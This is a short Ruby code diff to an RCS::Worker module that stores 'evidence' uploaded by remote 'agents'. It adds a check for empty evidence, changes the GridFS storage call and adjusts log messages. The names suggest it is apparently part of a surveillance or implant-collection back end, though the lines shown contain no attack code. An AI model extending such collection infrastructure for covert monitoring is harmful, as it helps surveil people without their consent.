@@ -14,14 +14,19 @@ module RCS::Worker
       instance = @params['_id'].slice(15..-1).downcase
       uid = "#{ident}:#{instance}"
 
+      if content.bytesize == 0
+        trace(:error, "Received an empty evidence belonging to agent #{uid}")
+        return ok(bytes: 0)
+      end
+
       # save the evidence in the db
       trace :debug, "Storing evidence #{uid} into local worker db"
-      grid_id = RCS::Worker::GridFS.put(content, {filename: "#{uid}"}, "evidence")
+      grid_id = RCS::DB::GridFS.put(content, {filename: "#{uid}"}, "evidence", :worker)
 
       # update the evidence statistics (dump to local file config/worker_stats)
       StatsManager.instance.add(inbound_evidence: 1, inbound_evidence_size: @request[:content]['content'].bytesize)
 
-      trace :debug, "Evidence [#{uid}][#{grid_id}] stored into local worker db."
+      trace :info, "Evidence [#{uid}][#{grid_id}] stored into local worker cache."
 
       InstanceWorkerMng.spawn_worker_thread(uid)
 
